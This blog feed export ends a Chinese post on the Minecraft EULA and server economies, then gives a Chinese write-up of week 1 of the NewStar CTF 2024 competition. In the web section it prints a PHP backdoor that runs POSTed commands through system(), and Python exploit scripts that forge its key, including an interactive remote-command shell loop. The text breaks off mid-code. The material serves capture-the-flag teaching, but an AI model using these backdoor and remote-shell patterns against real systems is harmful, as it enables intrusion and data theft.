eula。就像上文所说，开设服务器必须要有资本的支撑才能够运行。而这样的“资本来源”对于基于 mc 开设的商业服务器来说，从何而来，是一大难题。</p><p>但是 eula 并没有完全限制死商业服的发展</p><p>仔细阅读 eula，并没有说“不允许使用 mc 进行任何盈利”，而是说“试图通过<strong>我们创建的任何内容</strong>赚钱”“允许其他人以<strong>不公平或不合理的方式</strong>访问<strong>我们创建的任何内容</strong>”。</p><p>以 hypixel 为例，作为全球最大的小游戏服务器，hypixel 中氪金靠着 rank、gold、items 三大类，也就是特权、金币、道具。</p><p>hypixel 无疑是商业服，但是为什么说他符合 eula 呢？这三大类为什么符合 eula？</p><p>首先，所谓 <code>特权</code> ，在 hypixel 中仅仅是头衔称号、特效等徒有其表的加成，而 <code>道具</code> 也仅仅用做装饰用途，在实际游戏中，不管氪金多少，考验的都只是玩家的实力。而这些装饰特效，并不是 mojiang 创作的，是 hypixel 工作室自己编写的。所以无论从哪个角度看，hypixel 的商业模式在 eula 的规范下是相当成功的，名利双收。</p><p>而快餐服的特点是，吸金，氪金和不氪金的体验差距巨大，甚至能花钱买 op。</p><p>所以，eula 虽然没有实权，空有其表，但是确确实实规范了服务器与资本的关系，也确确实实指导腐竹们怎么进行服务器商业化的可持续化。</p><p>综上，不要仅仅将 eula 视为不同意就不让自己开服的屑文件。</p><p>在商业化时代，想赚钱但是遵守空有其表的 eula 好像确实是商业傻子，来钱肯定不如随心所欲的圈来的快。但不能否认的是，eula 的规范是商业服可持续化的必然之路，我们遵守 eula，也是对 mc 最基本的尊重。</p><h2 id="杂谈服务器经济体系">杂谈服务器经济体系</h2><p>玩了很多服务器，发现玩着玩着，人人大富翁，想要什么直接从服务器商店买，有新人进来先给他几十万带带他。</p><p>很明显，遇到通货膨胀问题了。</p><p>服务器货币一般有两种模式：</p><ol><li class="lvl-3"><p>游戏矿物。比如钻石</p></li><li class="lvl-3"><p>系统商店，计分板货币</p></li></ol><p>首先看第一种，矿物作为货币。以钻石为例，确实是一个理想货币：不可再生，一般情况需要劳动才能获得。但是忽略了劳动难度。开荒时，钻石往往是很稀缺的资源，一个开荒玩家手里一下掏出几组钻石去交易是不可能的，除非没日没夜开矿透去挖。因此，昂贵矿物作为货币往往因为<strong>产量过少</strong>导致<strong>市场缩减</strong>。</p><p>再看第二种，计分板货币，很常见的货币类型。下面是知乎某帖的回复。</p><blockquote><p>由于这个系统为每种劳动都人为定价了，必然会造成获取物品的价值之分（划算与否），导致的结果是所有人的玩法趋同，都向着挣钱最快的游戏方式努力，建设大量相同的设施，甚至养殖大量动物导致服务器卡顿。如果不调整兑换比例，在成为“土豪”后就会迅速对游戏厌倦，导致大量玩家流失，唯一的方式就是开始新周目所有财产清零，这也是很多服务器为什么生命周期如此之短的原因。</p></blockquote><p>总结两个方案。一边是缺钱，一边是钱太多。</p><p>针对第一个问题，直接的方案是增大钻石刷新率，并在前期提高钻石的价格。但是当附近钻石都被开采完毕，新玩家只能到更远的地方发展。这一来割裂了玩家，二来新玩家体验很差。</p><p>针对第二个问题，直接的方案是继续增大兑换比例，并减少玩家生产能力(比如添加体力系统)。但前一种治标不治本，后一种会引起玩家反感。所以，如果引入了计分板货币系统，通货膨胀是必然结局。</p><p>结论就是，<strong>mc 中任何经济体系都是没有用的</strong>。</p><p>(写文时候突发奇想一种解决方案，让所有玩家财产公有，但是每人每天有消费上限，共有财产定期收缴一部分。这种模式还是第一次想过)</p>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF 2024 校内赛道 week1 wp</title>
      <link href="/posts/9825a8eb.html"/>
      <url>/posts/9825a8eb.html</url>
      
        <content type="html"><![CDATA[<h1>NewStar CTF 2024 校内赛道 week1 wp</h1><p>比赛时间：<strong>2024.9.30 - 2024.11.3</strong></p><p>比赛一共五周，难度递增。</p><p>官方 wp：<a href="https://ns.openctf.net/wp/2024/">WriteUp - NewStar CTF 2024 (openctf.net)</a></p><p>在实际解题过程中未解出的题目使用 <code>*</code> 进行了标记</p><p><strong><input type="checkbox" id="checkbox0"><label for="checkbox0">表示必填，( ) 表示选填，实际填写需要去掉[ ] 和 ( )</label></strong></p><p><strong><em>题目解法不唯一！！！</em></strong></p><p><s>因为刚入门，pwn 的前置知识太多了，所以 pwn 不出来一点（</s></p><h2 id="week-1">week 1</h2><p>第一周非常基础，着重介绍一些 ctf 工具和常用 linux 指令</p><h3 id="Misc">Misc</h3><h4 id="WhereIsFlag">WhereIsFlag</h4><p><s>出题人太癫了</s></p><p>题目主要目的是 linux 基础指令学习</p><p>本题下发了 nc 环境，通过 <code>netcat</code> 工具连接(号称 TCP/IP 的瑞士军刀)。现在流行的 kali 发行版基本都内置了 nc 环境，win 的 nc 环境配置教程可以参考 <a href="https://blog.csdn.net/u013014594/article/details/122751921">csdn</a> 教程。(教程中涉及到修改环境变量，实际上，如果 cmd 运行在 netcat 根目录下，无需配置环境变量)</p><p>这里使用 kali 进行连接，打开 kali 终端(快捷键 <code>ctrl+alt+T</code> )，输入题目 nc 命令</p><p>这里介绍 nc <strong>发起连接</strong> 的基本命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] [端口]</span><br></pre></td></tr></table></figure><p>使用 <code>ls</code> | <code>cd</code> | <code>cat</code> 指令挨个翻就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls (参数) (dirname) # 显示指定工作目录下的内容</span><br><span class="line">-a：列出包括 . 开头的隐藏文件的所有文件及目录</span><br><span class="line">-d：只列出目录</span><br><span class="line">-l：以长格式显示文件和目录信息，包括权限、所有者、创建时间、大小</span><br><span class="line">-r：倒序显示文件和目录</span><br><span class="line">-t：按照修改时间排序，最新的文件在最前面</span><br><span class="line">-A：同 -a ，但不列出 &quot;.&quot; (目前目录) 及 &quot;..&quot; (父目录)</span><br><span class="line">-F：在列出的文件名后加一符号；例如可执行档则加 &quot;*&quot;, 目录则加 &quot;/&quot;</span><br><span class="line">-R：递归显示目录中的所有文件和子目录</span><br><span class="line">cd [dirname]      # 打开指定(相对/绝对)路径文件夹</span><br><span class="line">cat (参数) [filename]   # 打开当前文件夹下的文件并将文件内容并输出</span><br><span class="line">-n：对所有行显示行号</span><br><span class="line">-b：对非空行显示行号</span><br><span class="line">-s：压缩连续空行为一个空行</span><br><span class="line">-E：每行末尾显示 $ 符号</span><br><span class="line">-T：将 Tab 字符显示为 ^I</span><br><span class="line">-v：显示一些非打印字符</span><br></pre></td></tr></table></figure><p>注意文件包含 <code>fake</code> 字样的，尤其是 <code>fake_flag</code> <code>fake_key</code>，是在提示这是假的 flag、假的 key。(谁说学计算机不需要英语的？)</p><h4 id="Labyrinth">Labyrinth</h4><p>题目提示此题为 LSB(最低有效位) 隐写</p><blockquote><p>LSB 即为最低有效位（Least Significant Bit，lsb），我们知道，图片中的图像像素一般是由 RGB 三原色（红绿蓝）组成，每一种颜色占用 8 位，取值范围为 0x00 ~ 0xFF ，即有 256 种颜色，一共包含了 256 的 3 次方的颜色，即 16777216 种颜色。而人类的眼睛可以区分约 1000 万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有 6777216 种。<br>LSB 隐写就是修改 RGB 颜色分量的最低二进制位也就是最低有效位，而人类的眼睛不会注意到这前后的变化，每个像数可以携带 3 比特的信息。</p></blockquote><p>解决图片 lsb 隐写有两个很有效的工具：<code>zsteg</code> | <code>Stegsolve</code></p><p><a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve</a>：支持 jpg、png、bmp 格式。stegsolve 是一个.jar 文件，运行需要 java 环境。安装 java 环境的教程已经非常多了，这里不赘述了。在 windows 下配置好 java 环境后后双击 .jar 即可打开界面。</p><p><a href="https://www.cnblogs.com/hardcoreYutian/p/10613036.html">在 Kali Linux 中下载工具 Stegsolve - 平静的雨田 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/R-S-PY/p/12916983.html">CTF-StegSolve 使用介绍 - AlexANSO - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/Amherstieae/article/details/107512398">zsteg</a>：支持 png、bmp。相对来讲比 stegsolve 更方便。(里面也包含了 zsteg 一些基础指令)。</p><p>通过 stegsolve 的左右立体试图(可以通过下方的箭头控制偏移，也可以是左右方向键)，找到二维码，扫描得 flag</p><h4 id="decompress">decompress</h4><p>题目要求将内容 32 位小写 md5 计算后包上 flag{}</p><p>在线工具：<a href="https://www.toolhelper.cn/DigestAlgorithm/MD5">MD5 哈希 - 锤子在线工具 (toolhelper.cn)</a></p><h4 id="pleasingMusic">pleasingMusic</h4><p>音频隐写，听一遍音乐会发现有明显电报声</p><p>音频工具：<a href="https://www.audacityteam.org/download/">Audacity ® | Downloads (audacityteam.org)</a></p><p>题目提示音乐需要倒放，在 audacity 中 <code>ctrl+a</code> 全选音轨，<code>效果器-特殊-反向(时间)</code> 进行倒放处理。<code>ctrl + 鼠标滚轮</code> 放大音轨，在电报区域，短音轨代表摩斯密码中的短码<code>.</code> ，长音轨代表长码<code>-</code> ，较大空白部分为间隔。</p><p>提取摩斯密码后解码</p><p>在线工具：<a href="https://www.lddgo.net/encrypt/morse">在线摩斯密码翻译器 (lddgo.net)</a></p><p>注：不同在线工具使用的间隔符号不同，有的使用空格，有的使用 \</p><h3 id="Web">Web</h3><h4 id="headache3">headache3</h4><p>打开浏览器开发者工具(快捷键 <code>F12</code>)，在网络窗口查看请求，得到 flag</p><h4 id="智械危机">智械危机</h4><p>题目提示 <code>robots</code> ，可以到 <code>/robots.txt</code> 查看线索</p><blockquote><p>/robots.txt 一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被 robots 访问的部分，或者指定搜索引擎只收录指定的内容。</p></blockquote><p>Disallow 中得到 <code>/backd0or.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);         <span class="comment"># cmd参数是 base64 编码的 system 命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//将key base64解码</span></span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">//初始化reversed_cmd</span></span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//将cmd字符串翻转为reversed_cmd</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算翻转后的cmd的md5哈希值</span></span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="comment">//将上一句md5哈希值与base64解码的key进行比较，进行key验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发送post请求</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据 WhereIsFlag 题目中的 <code>cat</code> 指令，可以将目标 cmd 指令设置为 <code>cat /flag</code> ，通过 post 发送请求，在目标服务器执行 cat 指令。</p><p>post 请求要求传入 key 进行验证，所以需要将 decrypt_request 逆向进行</p><ol><li class="lvl-3"><p>设置目标 cmd：cat /flag</p></li><li class="lvl-3"><p>base64 编码 cmd</p></li><li class="lvl-3"><p>翻转编码后的 cmd</p></li><li class="lvl-3"><p>计算翻转后的 md5 哈希值，这也是 key 的 base64 解码后的值</p></li><li class="lvl-3"><p>将 md5 哈希值进行 base64 编码，得到原始 key</p></li><li class="lvl-3"><p>post 请求发送 cmd 和 key</p></li></ol><p>下面分别是我在解题时用的代码和官方 wp 的代码(官方有两个版本，一是常规方案，二是简单的 shell 交互，后者官方推荐)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本人代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># Base64 编码命令</span></span><br><span class="line">    encoded_cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    <span class="comment"># 反转编码后的命令</span></span><br><span class="line">    reversed_cmd = encoded_cmd[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 计算反转命令的 MD5 哈希值</span></span><br><span class="line">    hashed_reversed_cmd =</span><br><span class="line">hashlib.md5(reversed_cmd.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># Base64 编码哈希值</span></span><br><span class="line">    encoded_key =</span><br><span class="line">base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> encoded_cmd, encoded_key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    encoded_cmd, encoded_key = generate_payload(cmd)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;cmd&#x27;</span>: encoded_cmd,</span><br><span class="line">        <span class="string">&#x27;key&#x27;</span>: encoded_key</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">return</span> response.text</span><br><span class="line"><span class="comment"># url替换为题目下发的url+/backd0or.php</span></span><br><span class="line">url = <span class="string">&#x27;http://example.com/backd0or.php&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">response = send_request(url, cmd)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方代码 常规方案</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for newstar_zhixieweiji&quot;</span>)</span><br><span class="line"><span class="comment"># 定义url和cmd</span></span><br><span class="line">url = <span class="string">&quot;http://yourtarget.com/backd0or.php&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line"><span class="comment">#cmd base64编码</span></span><br><span class="line">cmd_encoded = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"><span class="comment">#翻转cmd的base64编码</span></span><br><span class="line">cmd_reversed = cmd_encoded[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#md5编码翻转cmd的base64编码</span></span><br><span class="line">hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()</span><br><span class="line"><span class="comment">#base64编码得key</span></span><br><span class="line">encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: cmd_encoded,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: encoded_key</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方代码 shell交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Shell for newstar_zhixieweiji&quot;</span>)</span><br><span class="line"><span class="comment"># 目标url</span></span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;[+] Enter the target URL: &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># cmd base64编码</span></span><br><span class="line">    cmd_encoded = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    <span class="comment"># 翻转</span></span><br><span class="line">    cmd_reversed = cmd_encoded[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># md5</span></span><br><span class="line">    hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># base64得key</span></span><br><span class="line">    encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">    <span class="comment"># 构造请求的payload</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;cmd&#x27;</span>: cmd_encoded,<span class="string">&#x27;key&#x27;</span>: encoded_key&#125;</span><br><span class="line">    <span class="comment"># 发送post，获得响应</span></span><br><span class="line">    response = requests.post(url, data=payload)</span><br><span class="line">    <span class="comment"># 返回响应并去掉最后一个字符</span></span><br><span class="line">    <span class="keyword">return</span> response.text[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 获得目标主机名</span></span><br><span class="line">hostname = execute_command(<span class="string">&quot;hostname&quot;</span>)</span><br><span class="line"><span class="comment"># 获得用户名</span></span><br><span class="line">username = execute_command(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># 无限循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 获得当前目录</span></span><br><span class="line">    directory = execute_command(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">    <span class="comment"># 输入指令</span></span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">f&quot;<span class="subst">&#123;username&#125;</span>@<span class="subst">&#123;hostname&#125;</span>:<span class="subst">&#123;directory&#125;</span>$ &quot;</span>)</span><br><span class="line">    <span class="comment"># 发送指令</span></span><br><span class="line">    output = execute_command(command)</span><br><span class="line">    <span class="comment"># 打印输出</span></span><br><span class="line">    <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><h4 id="会赢吗">会赢吗</h4><p><s>分尸题太 ex 了</s></p><p>flag 被分为多段。</p><h5 id="flag1">flag1</h5><p>通过开发者工具可以得到，并且给出了第二段的 url</p><h5 id="flag2">flag2</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">revealFlag</span>(<span class="params">className</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/flag/<span class="subst">$&#123;className&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(</span></span><br><span class="line"><span class="language-javascript">          <span class="string">`恭喜你！你获得了第二部分的 flag: <span class="subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="subst">$&#123;data.nextLevel&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">        );</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求失败，请检查输入或服务器响应。&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求过程中出现错误:&quot;</span>, error);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 控制台提示</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示，有两种思路</p><ol><li class="lvl-3"><p>在控制台执行 revealFlag(‘4cqu1siti0n’)即可</p></li><li class="lvl-3"><p>发送 post 请求，请求头包含’Content-Type’: ‘application/json’</p></li></ol><h5 id="flag3">flag3</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;seal_him&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> stateElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;state&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> messageElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (stateElement.<span class="property">textContent</span>.<span class="title function_">trim</span>() !== <span class="string">&quot;解封&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        messageElement.<span class="property">textContent</span> = <span class="string">&quot;如何是好？&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">try</span> 